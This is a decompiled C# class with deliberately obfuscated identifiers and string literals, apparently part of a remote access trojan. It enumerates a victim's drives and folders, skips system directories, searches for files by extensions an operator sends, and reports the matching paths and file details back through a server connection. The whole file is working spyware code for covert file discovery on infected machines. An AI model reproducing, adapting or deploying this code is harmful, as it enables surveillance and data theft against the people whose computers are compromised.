using System;
using System.Collections.Generic;
using System.IO;

namespace roigtbraorn;

internal class DRAIIVF
{
	public int roigtbraornfIndx = 0;

	public bool roigtbraornreaging = false;

	public List<string> roigtbraornsFiles = new List<string>();

	public MCAIDM iserver;

	public List<string> roigtbraornfExts = new List<string>();

	public List<string> roigtbraornnotFilders = new List<string>();

	public string roigtbraornmainPath;

	public int roigtbraornsIndx = 0;

	public string roigtbraornfilesLogs = COAINF.roigtbraornfilesLogs;

	public bool roigtbraornseae_Access(string fPath)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(fPath);
		try
		{
			directoryInfo.GetDirectories();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public string roigtbraornchaeck_Folders(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] directories = Directory.GetDirectories(path);
			foreach (string text2 in directories)
			{
				if (roigtbraornseae_Access(text2))
				{
					text = text + text2 + ">|roigtbraorn".Split(new char[1] { '|' })[0];
				}
			}
		}
		return text;
	}

	public IEnumerable<string> roigtbraornadad_Files(string path)
	{
		Queue<string> moreFiles = new Queue<string>();
		moreFiles.Enqueue(path);
		while (moreFiles.Count > 0 && !iserver.roigtbraornautCnls)
		{
			path = moreFiles.Dequeue();
			try
			{
				string[] directories = Directory.GetDirectories(path);
				foreach (string text in directories)
				{
					if (roigtbraornseae_Access(text) && !roigtbraornnotFilders.Contains(text.ToLower()))
					{
						moreFiles.Enqueue(text);
					}
				}
			}
			catch
			{
			}
			string[] files = Directory.GetFiles(path);
			if (files != null)
			{
				for (int i = 0; i < files.Length; i++)
				{
					yield return files[i];
				}
			}
		}
	}

	public string roigtbraornloaokup_Files(string path)
	{
		string text = "";
		if (Directory.Exists(path))
		{
			string[] files = Directory.GetFiles(path);
			foreach (string text2 in files)
			{
				text = text + text2 + ">|roigtbraorn".Split(new char[1] { '|' })[0];
			}
		}
		return text;
	}

	public DRAIIVF()
	{
		roigtbraornnotFilders.Add("documents and settings|roigtbraorn".Split(new char[1] { '|' })[0]);
		roigtbraornnotFilders.Add("windows|roigtbraorn".Split(new char[1] { '|' })[0]);
		roigtbraornnotFilders.Add("program files|roigtbraorn".Split(new char[1] { '|' })[0]);
		roigtbraornnotFilders.Add("system volume information|roigtbraorn".Split(new char[1] { '|' })[0]);
		roigtbraornnotFilders.Add("program files (x86)|roigtbraorn".Split(new char[1] { '|' })[0]);
		roigtbraornnotFilders.Add("programdata|roigtbraorn".Split(new char[1] { '|' })[0]);
	}

	public void roigtbraornloaok_Files(string tempStr)
	{
		iserver.roigtbraornautCnls = false;
		roigtbraornfExts.Clear();
		roigtbraornsFiles.Clear();
		roigtbraornfIndx = 0;
		roigtbraornsIndx = 0;
		string[] array = tempStr.Split(new char[1] { '<' });
		if (array.Length <= 1)
		{
			return;
		}
		string[] array2 = array[0].Split(new char[1] { '>' });
		string[] array3 = array2;
		foreach (string text in array3)
		{
			if (text != "")
			{
				roigtbraornfExts.Add(text);
			}
		}
		if (array[1] != "")
		{
			roigtbraornreaging = true;
			roigtbraornseand_Search(array[1]);
			roigtbraornreaging = false;
			iserver.roigtbraornpuash_data(null, "roigtbraorn-seaard=|roigtbraorn".Split(new char[1] { '|' })[0]);
		}
	}

	public string roigtbraornloaokup_Drives()
	{
		string text = "";
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			if (driveInfo.IsReady)
			{
				text = text + driveInfo.Name + ">|roigtbraorn".Split(new char[1] { '|' })[0];
			}
		}
		return text;
	}

	public void roigtbraornseand_Search(string path)
	{
		try
		{
			foreach (string item in roigtbraornadad_Files(path))
			{
				int num = item.LastIndexOf(".");
				if (num < 0)
				{
					num = 0;
				}
				string text = item.Substring(num);
				if (roigtbraornfExts.Contains(text.ToLower()))
				{
					string text2 = iserver.roigtbraornfiale_info(item, ret: true);
					iserver.roigtbraornpuash_data(null, "roigtbraorn-seaarf=|roigtbraorn".Split(new char[1] { '|' })[0] + item + "<FIALE_AUATO<|roigtbraorn".Split(new char[1] { '|' })[0] + text2);
				}
				if (iserver.roigtbraornautCnls)
				{
					break;
				}
			}
		}
		catch
		{
		}
	}
}
